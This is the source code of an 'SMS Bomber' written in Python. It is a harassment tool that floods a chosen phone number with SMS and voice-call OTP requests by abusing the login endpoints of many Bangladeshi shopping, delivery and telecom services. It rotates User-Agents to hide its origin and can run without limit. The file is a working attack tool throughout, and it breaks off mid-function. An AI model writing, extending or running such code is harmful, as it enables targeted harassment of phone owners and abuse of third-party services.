import json
import asyncio
import aiohttp
import random
import string
import os
import sys
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Colors for terminal
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
P = '\033[1;35m' # Purple
C = '\033[1;36m' # Cyan
W = '\033[1;37m' # White

# List of random User-Agents to mask device identity
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
]

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def banner():
    print(f"""
{C}╔══════════════════════════════════════════════════════════════╗
║ {Y}   ____  __  __ ____    ____   ___  __  __ ____  _____ ____  {C}║
║ {Y}  / ___||  \/  / ___|  | __ ) / _ \|  \/  | | __ )| ____|  _ \ {C}║
║ {Y}  \___ \| |\/| \___ \  |  _ \| | | | |\/| | |  _ \| _| | |_) |{C}║
║ {Y}   ___) | |  | |___) | | |_) | |_| | |  | | | |_) | |___|  _ < {C}║
║ {Y}  |____/|_|  |_|____/  |____/ \___/|_|  |_| |____/|_____|_| \_\{C}║
║                                                              ║
║ {W}      Cross-Platform SMS Bomber (iOS, Android, Windows)      {C}║
║ {W}           Created for: a-Shell, Termux, Windows             {C}║
║ {G}           Security: Session, Smart Retry, Log, Jitter       {C}║
║ {P}           Engine: Asyncio & Aiohttp (High Speed)            {C}║
╚══════════════════════════════════════════════════════════════╝
    """)

def get_random_name():
    return ''.join(random.choices(string.ascii_letters, k=8))

def get_random_email():
    return f"{get_random_name()}@gmail.com"

def get_random_phone():
    return "01" + "".join(random.choices(string.digits, k=9))

class AsyncBomber:
    def __init__(self, target, limit, mode='sms', stop_event=None):
        self.target = target
        self.limit = limit # 0 means infinite
        self.mode = mode
        self.sent = 0
        self.failed = 0
        self.running = True
        self.stop_event = stop_event if stop_event else asyncio.Event()
        self.log_file = f"bombing_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.session = None # aiohttp session will be created later
        self.api_cooldowns = {} # Tracks cooldown for each API
        self.backoff_time = 30 # Initial backoff time in seconds

        with open(self.log_file, "w") as f:
            f.write(f"Bombing Session Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target: {self.target} | Mode: {self.mode.upper()}\n")
            f.write("-" * 60 + "\n")

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.close()

    def get_headers(self, origin=None, referer=None, extra=None):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,bn;q=0.8",
            "Connection": "keep-alive"
        }
        if origin:
            headers["Origin"] = origin
        if referer:
            headers["Referer"] = referer
        if extra:
            headers.update(extra)
        return headers

    async def log_event(self, api_name, success, status_code=None):
        timestamp = datetime.now().strftime("%H:%M:%S")
        status = "SUCCESS" if success else "FAILED"
        log_entry = f"[{timestamp}] {api_name:15} | {status:7} | Code: {status_code}\n"

        with open(self.log_file, "a") as f:
            f.write(log_entry)

        if success:
            self.sent += 1
            color = G
            icon = "✓"
        else:
            self.failed += 1
            color = R
            icon = "✗"

        limit_str = "∞" if self.limit == 0 else str(self.limit)
        logging.info(f"{color}[{icon}] {timestamp} | {api_name:15} | {status:7} | Sent: {self.sent}/{limit_str}{W}")

    # SMS APIs

    async def api_api109___chaldal_otp(self):
        target = self.target
        url = "https://chaldal.com/api/customer/SendOTP"
        try:
            async with self.session.post(url, json={"phoneNumber": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API109 - Chaldal OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API109 - Chaldal OTP", False, "Error")
            return False

    async def api_api110___pathao_otp(self):
        target = self.target
        url = "https://api.pathao.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API110 - Pathao OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API110 - Pathao OTP", False, "Error")
            return False

    async def api_api111___sharetrip_otp(self):
        target = self.target
        url = "https://api.sharetrip.net/api/v1/otp/send"
        try:
            async with self.session.post(url, json={"mobile": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API111 - ShareTrip OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API111 - ShareTrip OTP", False, "Error")
            return False

    async def api_api112___shohoz_otp(self):
        target = self.target
        url = "https://www.shohoz.com/api/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API112 - Shohoz OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API112 - Shohoz OTP", False, "Error")
            return False

    async def api_api113___foodpanda_otp(self):
        target = self.target
        url = "https://www.foodpanda.com.bd/api/v1/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API113 - Foodpanda OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API113 - Foodpanda OTP", False, "Error")
            return False

    async def api_api114___hungrynaki_otp(self):
        target = self.target
        url = "https://api.hungrynaki.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API114 - HungryNaki OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API114 - HungryNaki OTP", False, "Error")
            return False

    async def api_api115___rokomari_otp(self):
        target = self.target
        url = "https://www.rokomari.com/api/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API115 - Rokomari OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API115 - Rokomari OTP", False, "Error")
            return False

    async def api_api116___evaly_otp(self):
        target = self.target
        url = "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API116 - Evaly OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API116 - Evaly OTP", False, "Error")
            return False

    async def api_api117___amarpay_otp(self):
        target = self.target
        url = "https://api.amarpay.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API117 - AmarPay OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API117 - AmarPay OTP", False, "Error")
            return False

    async def api_api118___pickaboo_otp(self):
        target = self.target
        url = "https://api.pickaboo.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API118 - Pickaboo OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API118 - Pickaboo OTP", False, "Error")
            return False

    async def api_api119___ajkerdeal_otp(self):
        target = self.target
        url = "https://api.ajkerdeal.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API119 - AjkerDeal OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API119 - AjkerDeal OTP", False, "Error")
            return False

    async def api_api120___priyoshop_otp(self):
        target = self.target
        url = "https://api.priyoshop.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API120 - PriyoShop OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API120 - PriyoShop OTP", False, "Error")
            return False

    async def api_api121___bikroy_otp_v2(self):
        target = self.target
        url = "https://bikroy.com/data/authenticate/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API121 - Bikroy OTP V2", success, res.status)
                return success
        except Exception:
            await self.log_event("API121 - Bikroy OTP V2", False, "Error")
            return False

    async def api_api122___daraz_otp_v2(self):
        target = self.target
        url = "https://member.daraz.com.bd/user/api/sendOtp"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API122 - Daraz OTP V2", success, res.status)
                return success
        except Exception:
            await self.log_event("API122 - Daraz OTP V2", False, "Error")
            return False

    # Call APIs

    async def api_call1___robi_call_otp(self):
        target = self.target
        url = "https://api.robi.com.bd/v1/auth/call-otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL1 - Robi Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL1 - Robi Call OTP", False, "Error")
            return False

    async def api_call2___daraz_call_otp(self):
        target = self.target
        url = "https://api.daraz.com.bd/v1/auth/call-otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL2 - Daraz Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL2 - Daraz Call OTP", False, "Error")
            return False

    async def api_call3___pathao_call_otp(self):
        target = self.target
        url = "https://api.pathao.com/v1/auth/call-otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL3 - Pathao Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL3 - Pathao Call OTP", False, "Error")
            return False

    async def api_call4___shohoz_call_otp(self):
        target = self.target
        url = "https://api.shohoz.com/v1/auth/call-otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL4 - Shohoz Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL4 - Shohoz Call OTP", False, "Error")
            return False

    async def api_call5___chaldal_call_otp(self):
        target = self.target
        url = "https://chaldal.com/api/customer/SendVoiceOTP"
        try:
            async with self.session.post(url, json={"phoneNumber": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL5 - Chaldal Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL5 - Chaldal Call OTP", False, "Error")
            return False

    async def api_call6___foodpanda_call_otp(self):
        target = self.target
        url = "https://www.foodpanda.com.bd/api/v1/otp/send-voice"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL6 - Foodpanda Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL6 - Foodpanda Call OTP", False, "Error")
            return False

    async def api_call7___evaly_call_otp(self):
        target = self.target
        url = "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL7 - Evaly Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL7 - Evaly Call OTP", False, "Error")
            return False

    async def api_call8___hungrynaki_call_otp(self):
        target = self.target
        url = "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL8 - HungryNaki Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL8 - HungryNaki Call OTP", False, "Error")
            return False

    async def api_call9___rokomari_call_otp(self):
        target = self.target
        url = "https://www.rokomari.com/api/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target, "type": "voice"}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL9 - Rokomari Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL9 - Rokomari Call OTP", False, "Error")
            return False

    async def api_call10___airtel_call_otp(self):
        target = self.target
        url = "https://api.airtel.com.bd/vas/v1/otp/send"
        try:
            async with self.session.post(url, json={"msisdn": target, "type": "voice"}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL10 - Airtel Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL10 - Airtel Call OTP", False, "Error")
            return False

    async def api_call11___gp_call_otp_v2(self):
        target = self.target
        url = "https://www.grameenphone.com/api/v1/otp/send"
        try:
            async with self.session.post(url, json={"phone": target, "method": "voice"}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL11 - GP Call OTP V2", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL11 - GP Call OTP V2", False, "Error")
            return False

    async def api_call12___extra_call_api_12(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[12 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL12 - Extra API 12", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL12 - Extra API 12", False, "Error")
            return False

    async def api_call13___extra_call_api_13(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[13 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL13 - Extra API 13", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL13 - Extra API 13", False, "Error")
            return False

    async def api_call14___extra_call_api_14(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[14 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL14 - Extra API 14", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL14 - Extra API 14", False, "Error")
            return False

    async def api_call15___extra_call_api_15(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[15 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL15 - Extra API 15", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL15 - Extra API 15", False, "Error")
            return False

    async def api_call16___extra_call_api_16(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[16 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL16 - Extra API 16", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL16 - Extra API 16", False, "Error")
            return False

    async def api_call17___extra_call_api_17(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[17 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL17 - Extra API 17", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL17 - Extra API 17", False, "Error")
            return False

    async def api_call18___extra_call_api_18(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[18 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL18 - Extra API 18", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL18 - Extra API 18", False, "Error")
            return False

    async def api_call19___extra_call_api_19(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[19 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL19 - Extra API 19", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL19 - Extra API 19", False, "Error")
            return False

    async def api_call20___extra_call_api_20(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[20 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL20 - Extra API 20", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL20 - Extra API 20", False, "Error")
            return False

    async def api_call21___extra_call_api_21(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[21 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL21 - Extra API 21", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL21 - Extra API 21", False, "Error")
            return False

    async def api_call22___extra_call_api_22(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[22 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL22 - Extra API 22", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL22 - Extra API 22", False, "Error")
            return False

    async def api_call23___extra_call_api_23(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[23 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL23 - Extra API 23", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL23 - Extra API 23", False, "Error")
            return False

    async def api_call24___extra_call_api_24(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[24 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL24 - Extra API 24", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL24 - Extra API 24", False, "Error")
            return False

    async def api_call25___extra_call_api_25(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[25 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL25 - Extra API 25", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL25 - Extra API 25", False, "Error")
            return False

    async def api_call26___extra_call_api_26(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[26 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL26 - Extra API 26", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL26 - Extra API 26", False, "Error")
            return False

    async def api_call27___extra_call_api_27(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[27 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL27 - Extra API 27", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL27 - Extra API 27", False, "Error")
            return False

    async def api_call28___extra_call_api_28(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[28 % len(endpoints)]
        try:
